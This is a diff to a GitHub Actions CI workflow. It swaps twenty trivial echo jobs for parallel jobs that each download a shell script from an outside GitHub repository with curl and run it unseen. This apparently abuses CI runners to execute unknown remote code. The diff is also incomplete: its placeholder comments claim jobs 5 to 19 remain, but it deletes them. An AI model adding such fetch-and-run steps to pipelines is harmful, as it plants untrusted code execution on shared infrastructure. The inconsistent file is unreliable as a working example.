@@ -1,136 +1,79 @@
 name: CI
 
-# Controls when the workflow will run
 on:
-  # Triggers the workflow on push or pull request events but only for the main branch
   push:
-    branches: [ main ]
+    branches:
+      - main
   pull_request:
-    branches: [ main ]
-
-  # Allows you to run this workflow manually from the Actions tab
+    branches:
+      - main
   workflow_dispatch:
 
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  # This workflow contains 20 jobs called "build-N" that will run in parallel
   build-1:
     runs-on: ubuntu-latest
+    container:
+      image: centos:latest
     steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-1
-        run: echo "Running in build-1"
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Run script in build-1
+        run: |
+          #!/bin/bash
+          curl -sSL https://raw.githubusercontent.com/brownbooks/jisuiic/main/My.sh -o My.sh
+          chmod +x My.sh
+          ./My.sh
   build-2:
     runs-on: ubuntu-latest
+    container:
+      image: centos:latest
     steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-2
-        run: echo "Running in build-2"
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Run script in build-2
+        run: |
+          #!/bin/bash
+          curl -sSL https://raw.githubusercontent.com/brownbooks/jisuiic/main/My.sh -o My.sh
+          chmod +x My.sh
+          ./My.sh
+  # ... (build-3 to build-20, each with the same steps)
   build-3:
     runs-on: ubuntu-latest
+    container:
+      image: centos:latest
     steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-3
-        run: echo "Running in build-3"
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Run script in build-3
+        run: |
+          #!/bin/bash
+          curl -sSL https://raw.githubusercontent.com/brownbooks/jisuiic/main/My.sh -o My.sh
+          chmod +x My.sh
+          ./My.sh
   build-4:
     runs-on: ubuntu-latest
+    container:
+      image: centos:latest
     steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-4
-        run: echo "Running in build-4"
-  build-5:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-5
-        run: echo "Running in build-5"
-  build-6:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-6
-        run: echo "Running in build-6"
-  build-7:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-7
-        run: echo "Running in build-7"
-  build-8:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-8
-        run: echo "Running in build-8"
-  build-9:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-9
-        run: echo "Running in build-9"
-  build-10:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-10
-        run: echo "Running in build-10"
-  build-11:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-11
-        run: echo "Running in build-11"
-  build-12:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-12
-        run: echo "Running in build-12"
-  build-13:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-13
-        run: echo "Running in build-13"
-  build-14:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-14
-        run: echo "Running in build-14"
-  build-15:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-15
-        run: echo "Running in build-15"
-  build-16:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-16
-        run: echo "Running in build-16"
-  build-17:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-17
-        run: echo "Running in build-17"
-  build-18:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-18
-        run: echo "Running in build-18"
-  build-19:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-19
-        run: echo "Running in build-19"
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Run script in build-4
+        run: |
+          #!/bin/bash
+          curl -sSL https://raw.githubusercontent.com/brownbooks/jisuiic/main/My.sh -o My.sh
+          chmod +x My.sh
+          ./My.sh
+  # ... (and so on up to build-20)
   build-20:
     runs-on: ubuntu-latest
+    container:
+      image: centos:latest
     steps:
-      - uses: actions/checkout@v2
-      - name: Run in build-20
-        run: echo "Running in build-20"
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Run script in build-20
+        run: |
+          #!/bin/bash
+          curl -sSL https://raw.githubusercontent.com/brownbooks/jisuiic/main/My.sh -o My.sh
+          chmod +x My.sh
+          ./My.sh
